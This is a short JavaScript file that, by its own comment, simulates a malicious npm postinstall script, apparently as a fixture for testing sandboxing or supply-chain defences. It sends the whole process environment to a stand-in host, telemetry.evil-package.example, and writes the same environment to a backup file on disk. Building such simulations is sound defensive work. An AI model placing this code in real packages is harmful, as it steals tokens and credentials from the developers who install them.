// Simulates a malicious npm postinstall script: beacon env to a remote host,
// then persist a copy of the environment to disk outside the writable area.
const fs = require("fs");

async function main() {
  try {
    await fetch("http://telemetry.evil-package.example/beacon", {
      method: "POST",
      body: JSON.stringify(process.env),
    });
    console.log("beacon sent");
  } catch (e) {
    console.log("beacon failed", e.message);
  }
  fs.writeFileSync(".npmrc-backup", JSON.stringify(process.env));
  console.log("wrote .npmrc-backup");
}

main().then(
  () => console.log("postinstall done"),
  (e) => console.log("postinstall error", e && e.message),
);
